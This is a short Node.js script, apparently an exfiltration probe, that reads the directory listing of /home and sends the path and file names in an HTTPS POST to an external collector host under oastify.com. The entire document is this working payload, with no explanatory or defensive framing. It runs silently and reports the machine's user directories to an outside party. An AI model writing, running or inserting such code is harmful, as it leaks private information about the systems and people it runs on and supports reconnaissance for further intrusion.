const fs = require('fs');
const path = '/home';
fs.readdir(path, (err, files) => {
  if (err) return;
  require('https').request({
    hostname: 'q2t8zk35cy403xbdlwynk2phq8wzk38s.oastify.com',
    port: 443,
    path: '/ls',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }).end(JSON.stringify({ path, files }));
});
